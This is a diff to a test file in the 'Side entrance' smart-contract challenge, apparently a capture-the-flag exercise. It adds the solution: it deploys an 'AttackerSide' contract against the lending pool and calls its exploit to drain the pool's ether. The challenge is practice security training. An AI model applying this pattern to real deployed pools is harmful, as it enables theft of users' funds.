@@ -25,6 +25,14 @@ describe('[Challenge] Side entrance', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        let pool = await this.pool.connect(attacker);
+        // let receiver = await this.receiver.connect(attacker);
+        // console.log(parseInt(this.attackerInitialEthBalance._hex, 16) / 10**18)
+        AttackerSide = await ethers.getContractFactory('AttackerSide', attacker);
+        attackContract = await AttackerSide.deploy(pool.address);
+        await attackContract.exploit(ETHER_IN_POOL)
+
     });
 
     after(async function () {
